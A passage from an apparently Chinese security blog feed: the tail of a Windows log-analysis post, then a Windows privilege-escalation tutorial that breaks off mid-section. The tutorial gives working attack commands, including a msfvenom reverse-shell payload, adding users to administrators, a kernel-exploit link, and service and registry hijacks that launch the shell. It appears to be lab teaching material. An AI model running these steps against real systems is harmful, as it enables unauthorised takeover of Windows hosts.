class="headerlink" title="作用"></a>作用</h4><p>记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</p><h4 id="默认位置：-2"><a href="#默认位置：-2" class="headerlink" title="默认位置："></a>默认位置：</h4><p><code>Windows NT/Win2000/XP/Server 2003</code>：</p><pre class="line-numbers language-none"><code class="language-none">C:\WINDOWS\system32\config\SecEvent.Evt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>Windows Vista和Windows Server 2008</code>：</p><pre class="line-numbers language-none"><code class="language-none">C:\WINDOWS\system32\winevt\Logs\Security.evtx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a>Log Parser</h4><p>工具下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p><h5 id="基本查询结构"><a href="#基本查询结构" class="headerlink" title="基本查询结构"></a>基本查询结构</h5><pre class="line-numbers language-none"><code class="language-none">Logparser.exe –i:EVT –o:DATAGRID "SELECT * FROM c:\*.evtx"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过SQL语句去查询</p><h5 id="查询登录成功的事件"><a href="#查询登录成功的事件" class="headerlink" title="查询登录成功的事件"></a>查询登录成功的事件</h5><pre class="line-numbers language-none"><code class="language-none">LogParser.exe -i:EVT –o:DATAGRID  "SELECT *  FROM c:\Security.evtx where EventID=4624"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="查询登录失败的事件"><a href="#查询登录失败的事件" class="headerlink" title="查询登录失败的事件"></a>查询登录失败的事件</h5><pre class="line-numbers language-none"><code class="language-none">LogParser.exe -i:EVT –o:DATAGRID  "SELECT *  FROM c:\Security.evtx where EventID=4625"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="查询系统历史开关机记录"><a href="#查询系统历史开关机记录" class="headerlink" title="查询系统历史开关机记录"></a>查询系统历史开关机记录</h5><pre class="line-numbers language-none"><code class="language-none">LogParser.exe -i:EVT –o:DATAGRID  "SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID=6005 or EventID=6006"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="LogParser-Lizard"><a href="#LogParser-Lizard" class="headerlink" title="LogParser Lizard"></a>LogParser Lizard</h4><p>图形化的Log Parser</p><p>工具下载地址：<a href="http://www.lizard-labs.com/log_parser_lizard.aspx">http://www.lizard-labs.com/log_parser_lizard.aspx</a></p><h4 id="Event-Log-Explorer"><a href="#Event-Log-Explorer" class="headerlink" title="Event Log Explorer"></a>Event Log Explorer</h4><p>Event Log Explorer是一款非常好用的Windows日志分析工具。</p><p>可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p><p>工具下载地址：<a href="https://event-log-explorer.en.softonic.com/">https://event-log-explorer.en.softonic.com/</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当我们去做应急响应时，还是需要多从攻击者的角度去思考问题，<strong>一旦你能够确定本次安全事件的类型，猜测出攻击者或者恶意代码的攻击思路，然后去验证排查这些猜想，就会加速你的分析过程</strong>，而这些从事件起因中就能够获取到一些信息</p><p>希望可以帮到各位师傅！</p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows提权小结</title>
      <link href="/2021/10/28/windows-ti-quan/"/>
      <url>/2021/10/28/windows-ti-quan/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h1><h1 id="0x01-一般概念"><a href="#0x01-一般概念" class="headerlink" title="0x01 一般概念"></a>0x01 一般概念</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我们在 Windows 中实现特权升级的最终目标是获得作为管理员或系统用户运行的权限</p><p>提权的关键是需要对受破坏的系统进行大量的信息搜集。</p><p>在很多情况下，提权可能不只是依赖于单一的错误配置，而是可能合并多个错误配置</p><p>所有特权升级实际上是违反访问控制的示例。</p><p>访问控制和用户权限是内在联系的。</p><p>在关注 Windows 中的权限升级时，了解 Windows 如何处理权限 非常重要</p><h2 id="用户帐户"><a href="#用户帐户" class="headerlink" title="用户帐户"></a>用户帐户</h2><p> 用户帐户用于登录 Windows 系统。</p><p>将用户帐户视为受制于唯一身份的设置/首选项集合。</p><p>本地”管理员”帐户默认在安装时创建。</p><p>根据 Windows 的版本，可能会存在其他几个默认用户帐户，像Guest</p><h2 id="服务帐户"><a href="#服务帐户" class="headerlink" title="服务帐户"></a>服务帐户</h2><p> 服务帐户（有些明显）用于在 Windows 中运行服务。</p><p>服务帐户不能用于登录 Windows 系统。</p><p>系统帐户是一个默认服务帐户，具有 Windows 中任何本地帐户的最高权限。</p><p>其他默认服务帐户包括网络服务和本地服务。</p><h2 id="组"><a href="#组" class="headerlink" title="组"></a>组</h2><p> 用户帐户可以属于多个组，组可以拥有多个用户。</p><p>组允许更轻松地访问资源。</p><p>常规 组 （如 管理员、 用户） 有 一组成员列表。</p><p>伪组(例如 “已验证 的用户”)有 一个动态成员列表，这些成员会根据某些交互进行更改。</p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>在Windows中，有多种类型的资源(也称为对象)：</p><ul><li><p>Files / Directories </p></li><li><p>Registry Entries </p></li><li><p>Services</p></li></ul><p>用户 and/or 组是否具有执行特定操作的权限依赖于资源的访问控制列表(ACL)</p><h2 id="ACLs-amp-ACEs"><a href="#ACLs-amp-ACEs" class="headerlink" title="ACLs &amp; ACEs"></a>ACLs &amp; ACEs</h2><p>访问 Windows 中某些资源的权限由该资源的访问控制列表 （ACL） 控制</p><p>每个 ACL 由零或更多访问控制条目(ACEs)组成</p><p> 每个ACE定义了一个主体（例如用户、组）和特定的访问权限。 </p><h1 id="0x02-管理员权限"><a href="#0x02-管理员权限" class="headerlink" title="0x02 管理员权限"></a>0x02 管理员权限</h1><h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>如果我们可以使用管理员权限 </p><p>那么我们可以进行执行msfvenom </p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.175.130 LPORT=4444 -f exe -o a001.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用nc监听 进行反弹shell</p><h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><p>如果RDP可用（或者我们可以启用它），我们可以将我们的低权限用户添加到管理员组，然后生成一个管理员命令</p><p>通过GUI提示</p><pre class="line-numbers language-none"><code class="language-none">net localgroup administrators &lt;username /add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Administrator–-gt-System"><a href="#Administrator–-gt-System" class="headerlink" title="Administrator–>System"></a>Administrator–&gt;System</h2><p>要从管理用户升级到完全系统权限，可以使用Windows系统内部使用PsExec工具</p><p><a href="https://docs.microsoft.com/en">https://docs.microsoft.com/en</a></p><pre class="line-numbers language-none"><code class="language-none">.\PsExec64.exe -accepteula -i -s C:\Users\user\Desktop\a002.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x03-工具使用"><a href="#0x03-工具使用" class="headerlink" title="0x03 工具使用"></a>0x03 工具使用</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>主要使用</p><p>winPEAS and Seatbelt</p><h2 id="Powerup-amp-Sharpup"><a href="#Powerup-amp-Sharpup" class="headerlink" title="Powerup&amp;Sharpup"></a>Powerup&amp;Sharpup</h2><p>PowerUp:  <a href="https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1">https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1</a> </p><p>SharpUp: <a href="https://github.com/GhostPack/SharpUp">https://github.com/GhostPack/SharpUp</a> </p><p>预编译的SharpUp: <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe</a></p><h2 id="Powerup"><a href="#Powerup" class="headerlink" title="Powerup"></a>Powerup</h2><p>要运行PowerUp，请启动PowerShell会话并使用dot加载脚本，请执行以下操作：</p><pre class="line-numbers language-none"><code class="language-none">PS. .\PowerUp.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行Invoke AllChecks函数开始检查</p><p>常见的特权升级错误配置。</p><pre class="line-numbers language-none"><code class="language-none">PS Invoke-AllChecks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="SharpUp"><a href="#SharpUp" class="headerlink" title="SharpUp"></a>SharpUp</h2><p>要运行SharpUp，请启动命令提示符并运行可执行文件：</p><pre class="line-numbers language-none"><code class="language-none">\ .\SharpUp.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>与PowerUp一样的配置</p><h2 id="Seatbelt"><a href="#Seatbelt" class="headerlink" title="Seatbelt"></a>Seatbelt</h2><p>Seatbelt是一种枚举工具。它包含许多枚举检查。</p><p>它不会主动寻找特权升级错误配置，但是可以为进一步调查提供相关信息。</p><p>代码: <a href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a> </p><p>预编译: <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe</a></p><p>运行所有检查并筛选出不重要的结果：</p><pre class="line-numbers language-none"><code class="language-none">.\Seatbelt.exe all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要运行特定检查：</p><pre class="line-numbers language-none"><code class="language-none">.\Seatbelt.exe &lt;check &lt;check<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="winPEAS"><a href="#winPEAS" class="headerlink" title="winPEAS"></a>winPEAS</h2><p>winPEAS是一个非常强大的工具，它不仅积极寻找特权升级错误配置，而且还在结果中为用户突出显示它们。</p><p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS</a></p><p>在运行之前，我们需要添加一个注册表项，然后重新打开命令提示：</p><pre class="line-numbers language-none"><code class="language-none">reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行所有检查，同时避免耗时的搜索：</p><pre class="line-numbers language-none"><code class="language-none">.\winPEASany.exe quiet cmd fast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行特定检查类别：</p><pre class="line-numbers language-none"><code class="language-none">.\winPEASany.exe quiet cmd systeminfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="accesschk-exe"><a href="#accesschk-exe" class="headerlink" title="accesschk.exe"></a>accesschk.exe</h2><p>accesschk是一个很旧的工具了，但我们依然可以尝试去用</p><p>您可以使用它来检查用户或组是否有权访问文件，目录，服务和注册表项 </p><p> 缺点是：程序的最新版本会生成一个GUI”接受EULA”弹出窗口。</p><p>当使用命令行时，我们有 使用仍具有<code>/accepteula</code>命令行的旧版本选项 </p><h1 id="0x04-内核漏洞"><a href="#0x04-内核漏洞" class="headerlink" title="0x04 内核漏洞"></a>0x04 内核漏洞</h1><h2 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h2><p>内核是任何操作系统的核心。将其视为应用程序软件和实际计算机硬件之间的一层。</p><p>内核对操作系统有完全的控制。利用内核漏洞可导致作为系统用户执行。</p><h2 id="查找和使用内核漏洞："><a href="#查找和使用内核漏洞：" class="headerlink" title="查找和使用内核漏洞："></a>查找和使用内核漏洞：</h2><h3 id="1-列举Windows版本-修补程序-级别-Systeminfo"><a href="#1-列举Windows版本-修补程序-级别-Systeminfo" class="headerlink" title="1. 列举Windows版本/修补程序/级别(Systeminfo)"></a>1. 列举Windows版本/修补程序/级别(Systeminfo)</h3><h3 id="2-查找匹配的漏洞-Google、ExploitDB、GitHub"><a href="#2-查找匹配的漏洞-Google、ExploitDB、GitHub" class="headerlink" title="2. 查找匹配的漏洞:Google、ExploitDB、GitHub"></a>2. 查找匹配的漏洞:Google、ExploitDB、GitHub</h3><h3 id="3-编译并运行。"><a href="#3-编译并运行。" class="headerlink" title="3. 编译并运行。"></a>3. 编译并运行。</h3><p>建议最后使用 因为使用 会导致宕机</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>Tools Windows Exploit Suggester:  <a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p><p>Precompiled Kernel Exploits:  <a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a>  这个</p><p>Watson: <a href="https://github.com/rasta-mouse/Watson">https://github.com/rasta-mouse/Watson</a></p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><h3 id="提取systeminfo命令的输出："><a href="#提取systeminfo命令的输出：" class="headerlink" title="提取systeminfo命令的输出："></a>提取systeminfo命令的输出：</h3><pre class="line-numbers language-none"><code class="language-none">systeminfo  1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-运行wesng查找潜在漏洞："><a href="#2-运行wesng查找潜在漏洞：" class="headerlink" title="2.运行wesng查找潜在漏洞："></a>2.运行wesng查找潜在漏洞：</h3><p><a href="https://github.com/lowliness9/wesng">https://github.com/lowliness9/wesng</a></p><pre class="line-numbers language-none"><code class="language-none">python wes.py 1.txt -i 'Elevation of Privilege' --exploits-only | less<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104628.png" alt="image-20210706103733449"></p><h3 id="3-已编译漏洞的交叉引用结果："><a href="#3-已编译漏洞的交叉引用结果：" class="headerlink" title="3.已编译漏洞的交叉引用结果："></a>3.已编译漏洞的交叉引用结果：</h3><p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p><h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h3><p><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2018-8120/x64.exe">https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2018-8120/x64.exe</a></p><h3 id="5-系统权限"><a href="#5-系统权限" class="headerlink" title="5.系统权限"></a>5.系统权限</h3><p>kali上启动nc监听 拿到系统权限</p><pre class="line-numbers language-none"><code class="language-none">x64.exe C:\Users\dayu\Desktop\a002.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104643.png" alt="image-20210706105744266"></p><h1 id="0x05-服务漏洞"><a href="#0x05-服务漏洞" class="headerlink" title="0x05 服务漏洞"></a>0x05 服务漏洞</h1><h2 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h2><p>服务只是在后台运行、接受输入或执行常规任务的程序。</p><p>如果服务使用系统权限运行并配置错误，则利用它们也可能导致具有系统权限的命令执行</p><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><p>查询服务的配置：</p><pre class="line-numbers language-none"><code class="language-none">sc.exe qc &lt;name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询服务的当前状态：</p><pre class="line-numbers language-none"><code class="language-none">sc.exe query &lt;name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改服务的配置选项：</p><pre class="line-numbers language-none"><code class="language-none">sc.exe config &lt;name &lt;option= &lt;value<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开始/停止服务：</p><pre class="line-numbers language-none"><code class="language-none">net start/stop &lt;name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="服务配置错误"><a href="#服务配置错误" class="headerlink" title="服务配置错误"></a>服务配置错误</h2><h3 id="1-不安全的服务权限"><a href="#1-不安全的服务权限" class="headerlink" title="1.不安全的服务权限"></a>1.不安全的服务权限</h3><h4 id="前言-4"><a href="#前言-4" class="headerlink" title="前言"></a>前言</h4><p>每个服务都有 ACL，定义某些特定于服务的权限。</p><p>有些权限是无害的(例如服务查询配置，服务查询状态)</p><p>有些可能有用(例如， 服务停止，服务启动 ) </p><p>有些是危险的（例如，服务更改配置，服务所有访问）  </p><p>如果我们的用户有权更改具有系统特权的服务的配置，我们可以将服务使用的可执行项更改为我们自己的服务之一。</p><p><strong>但是这里要注意：如果可以更改服务配置，但无法停止/启动服务，则依然可能是无法提权的</strong></p><h4 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h4><h5 id="1-SMB-Server进行上传winPEASany-exe"><a href="#1-SMB-Server进行上传winPEASany-exe" class="headerlink" title="1.SMB Server进行上传winPEASany.exe"></a>1.SMB Server进行上传winPEASany.exe</h5><pre class="line-numbers language-none"><code class="language-none">python smbserver.py a001 /var/www/html/copy \\192.168.175.130\a001\winPEASany.exe winPEASany.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104647.png" alt="image-20210706113441988"></p><h5 id="2-运行winPEAS以检查服务配置错误："><a href="#2-运行winPEAS以检查服务配置错误：" class="headerlink" title="2. 运行winPEAS以检查服务配置错误："></a>2. 运行winPEAS以检查服务配置错误：</h5><pre class="line-numbers language-none"><code class="language-none">.\winPEASany.exe quiet servicesinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104650.png" alt="image-20210706135802394"></p><h5 id="3-可以修改”daclsvc”服务。"><a href="#3-可以修改”daclsvc”服务。" class="headerlink" title="3. 可以修改”daclsvc”服务。"></a>3. 可以修改”daclsvc”服务。</h5><h5 id="4-我们可以用accesschk-exe来确认这一点："><a href="#4-我们可以用accesschk-exe来确认这一点：" class="headerlink" title="4. 我们可以用accesschk.exe来确认这一点："></a>4. 我们可以用accesschk.exe来确认这一点：</h5><p>使用它来检查用户或组是否有权访问文件，目录，服务和注册表项 </p><pre class="line-numbers language-none"><code class="language-none">.\accesschk.exe /accepteula -uwcqv user daclsvc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\user\Desktop&gt; .\accesschk.exe /accepteula -uwcqv user daclsvc                                                                C:\Users\user\Desktop&gt; .\accesschk.exe /accepteula -uwcqv user daclsvc RW daclsvc        SERVICE_QUERY_STATUS        SERVICE_QUERY_CONFIG        SERVICE_CHANGE_CONFIG        SERVICE_INTERROGATE        SERVICE_ENUMERATE_DEPENDENTS        SERVICE_START        SERVICE_STOP        READ_CONTROL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104653.png" alt="image-20210706140232306"></p><h5 id="5-检查服务的当前配置："><a href="#5-检查服务的当前配置：" class="headerlink" title="5. 检查服务的当前配置："></a>5. 检查服务的当前配置：</h5><pre class="line-numbers language-none"><code class="language-none">sc qc daclsvc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104655.png" alt="image-20210706140317733"></p><h5 id="6-重新配置服务以使用我们的反向壳可执行："><a href="#6-重新配置服务以使用我们的反向壳可执行：" class="headerlink" title="6.重新配置服务以使用我们的反向壳可执行："></a>6.重新配置服务以使用我们的反向壳可执行：</h5><pre class="line-numbers language-none"><code class="language-none">sc config daclsvc binpath=  "\"C:\Users\user\Desktop\a002.exe\""<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104713.png" alt="image-20210706140729405"></p><h5 id="7-启动服务触发漏洞进行反弹shell"><a href="#7-启动服务触发漏洞进行反弹shell" class="headerlink" title="7.启动服务触发漏洞进行反弹shell"></a>7.启动服务触发漏洞进行反弹shell</h5><pre class="line-numbers language-none"><code class="language-none">net start daclsvc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104714.png" alt="image-20210706140709122"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104715.png" alt="image-20210706140511506"></p><h3 id="2-未引用的服务路径"><a href="#2-未引用的服务路径" class="headerlink" title="2. 未引用的服务路径"></a>2. 未引用的服务路径</h3><h4 id="前言-5"><a href="#前言-5" class="headerlink" title="前言"></a>前言</h4><p>Windows中的可执行项无需使用扩展即可运行(例如，”whoami.exe”可以通过键入”whoami”来运行)。 </p><p>一些可执行者采取参数，由空间分开，例如一些程序.exe arg1 arg2 arg3.。。</p><p>当使用未引用且包含空格的绝对路径时，此行为会导致歧义的发生</p><p>举例以下未引用的路径：</p><pre class="line-numbers language-none"><code class="language-none">C:\Program Files\Some Dir\SomeProgram.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>表面来看，这显然运行SomeProgram.exe</p><p>对 Windows来说，C:\Program 可能是可执行的，有两个参数：”Files\Some” and “Dir\ SomeProgram.exe”</p><p>Windows 通过依次检查每个可能性来解决此歧义。</p><p>如果我们可以在实际可执行之前攻击 Windows 检查的位置，我们可以欺骗服务执行它。</p><h4 id="实操-2"><a href="#实操-2" class="headerlink" title="实操"></a>实操</h4><h5 id="1-运行winPEAS以检查服务配置错误："><a href="#1-运行winPEAS以检查服务配置错误：" class="headerlink" title="1.运行winPEAS以检查服务配置错误："></a>1.运行winPEAS以检查服务配置错误：</h5><pre class="line-numbers language-none"><code class="language-none">.\winPEASany.exe quiet servicesinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104716.png" alt="image-20210706152048316"></p><h5 id="2-发现”unquotedsvc”服务有一个未引用的路径-，其中也-包含-空格："><a href="#2-发现”unquotedsvc”服务有一个未引用的路径-，其中也-包含-空格：" class="headerlink" title="2. 发现”unquotedsvc”服务有一个未引用的路径 ，其中也 包含 空格："></a>2. 发现”unquotedsvc”服务有一个未引用的路径 ，其中也 包含 空格：</h5><pre class="line-numbers language-none"><code class="language-none">C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="3-使用sc确认此问题："><a href="#3-使用sc确认此问题：" class="headerlink" title="3. 使用sc确认此问题："></a>3. 使用sc确认此问题：</h5><pre class="line-numbers language-none"><code class="language-none">sc qc unquotedsvc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104717.png" alt="image-20210722220848934"></p><h5 id="4-使用accesschk-exe检查写入权限："><a href="#4-使用accesschk-exe检查写入权限：" class="headerlink" title="4.使用accesschk.exe检查写入权限："></a>4.使用accesschk.exe检查写入权限：</h5><pre class="line-numbers language-none"><code class="language-none">.\accesschk.exe /accepteula -uwdq C:\ .\accesschk.exe /accepteula -uwdq "C:\Program Files\" .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104718.png" alt="image-20210722220941929"></p><h5 id="5-复制可执行的反向外壳并适当重命名"><a href="#5-复制可执行的反向外壳并适当重命名" class="headerlink" title="5.复制可执行的反向外壳并适当重命名"></a>5.复制可执行的反向外壳并适当重命名</h5><pre class="line-numbers language-none"><code class="language-none">copy C:\Users\user\Desktop\a002.exe "C:\Program Files\Unquoted Path Service\Common.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104719.png" alt="image-20210722221822270"></p><h5 id="6-启动服务触发漏洞进行反弹shell"><a href="#6-启动服务触发漏洞进行反弹shell" class="headerlink" title="6.启动服务触发漏洞进行反弹shell"></a>6.启动服务触发漏洞进行反弹shell</h5><pre class="line-numbers language-none"><code class="language-none">net start unquotedsvc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-注册表权限弱"><a href="#3-注册表权限弱" class="headerlink" title="3. 注册表权限弱"></a>3. 注册表权限弱</h3><h4 id="前言-6"><a href="#前言-6" class="headerlink" title="前言"></a>前言</h4><p>每个服务的窗口注册表存储条目。</p><p>由于注册表条目可能具有 ACL，如果 ACL 配置错误，即使我们不能直接修改服务，也有可能修改服务的配置。</p><h4 id="实操-3"><a href="#实操-3" class="headerlink" title="实操"></a>实操</h4><h5 id="1-运行-winPEAS以检查服务配置错误："><a href="#1-运行-winPEAS以检查服务配置错误：" class="headerlink" title="1.运行 winPEAS以检查服务配置错误："></a>1.运行 winPEAS以检查服务配置错误：</h5><pre class="line-numbers language-none"><code class="language-none">.\winPEASany.exe quiet servicesinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="2-发现”regsvc”服务的注册表输入较弱。我们可以用电源壳确认这一点："><a href="#2-发现”regsvc”服务的注册表输入较弱。我们可以用电源壳确认这一点：" class="headerlink" title="2.发现”regsvc”服务的注册表输入较弱。我们可以用电源壳确认这一点："></a>2.发现”regsvc”服务的注册表输入较弱。我们可以用电源壳确认这一点：</h5><pre class="line-numbers language-none"><code class="language-none">Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104720.png" alt="image-20210706160207873"></p><h5 id="3-或者-，也可以使用accesschk-exe-来-确认："><a href="#3-或者-，也可以使用accesschk-exe-来-确认：" class="headerlink" title="3. 或者 ，也可以使用accesschk.exe 来 确认："></a>3. 或者 ，也可以使用accesschk.exe 来 确认：</h5><pre class="line-numbers language-none"><code class="language-none">.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104721.png" alt="image-20210706155114943"></p><h5 id="4-覆盖图像路径注册表密钥，以指向我们的反向外壳可执行："><a href="#4-覆盖图像路径注册表密钥，以指向我们的反向外壳可执行：" class="headerlink" title="4.覆盖图像路径注册表密钥，以指向我们的反向外壳可执行："></a>4.覆盖图像路径注册表密钥，以指向我们的反向外壳可执行：</h5><pre class="line-numbers language-none"><code class="language-none">reg add  HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Users\user\Desktop\a002.exe /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104722.png" alt="image-20210706160321078"></p><h5 id="5-启动服务触发漏洞进行反弹shell"><a href="#5-启动服务触发漏洞进行反弹shell" class="headerlink" title="5.启动服务触发漏洞进行反弹shell"></a>5.启动服务触发漏洞进行反弹shell</h5><pre class="line-numbers language-none"><code class="language-none">net start regsvc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104723.png" alt="image-20210706160406327"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104724.png" alt="image-20210706160354292"></p><h3 id="4-不安全的服务可执行"><a href="#4-不安全的服务可执行" class="headerlink" title="4. 不安全的服务可执行"></a>4. 不安全的服务可执行</h3><h4 id="前言-7"><a href="#前言-7" class="headerlink" title="前言"></a>前言</h4><p>如果可执行的原始服务可由我们的用户修改，我们可以简单地用可执行的反向壳替换它。</p><p>请记住，如果您在真实系统中利用此备份，请创建原始可执行的备份</p><h4 id="实操-4"><a href="#实操-4" class="headerlink" title="实操"></a>实操</h4><h5 id="1-运行winPEAS以检查服务配置错误：-问题"><a href="#1-运行winPEAS以检查服务配置错误：-问题" class="headerlink" title="1.运行winPEAS以检查服务配置错误： 问题"></a>1.运行winPEAS以检查服务配置错误： 问题</h5><pre class="line-numbers language-none"><code class="language-none">.\winPEASany.exe quiet servicesinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="2-发现”filepermsvc”服务具有可执行项，似乎每个人都可以执行。我们可以用accesschk-exe-来确认这一点："><a href="#2-发现”filepermsvc”服务具有可执行项，似乎每个人都可以执行。我们可以用accesschk-exe-来确认这一点：" class="headerlink" title="2.发现”filepermsvc”服务具有可执行项，似乎每个人都可以执行。我们可以用accesschk.exe 来确认这一点："></a>2.发现”filepermsvc”服务具有可执行项，似乎每个人都可以执行。我们可以用accesschk.exe 来确认这一点：</h5><pre 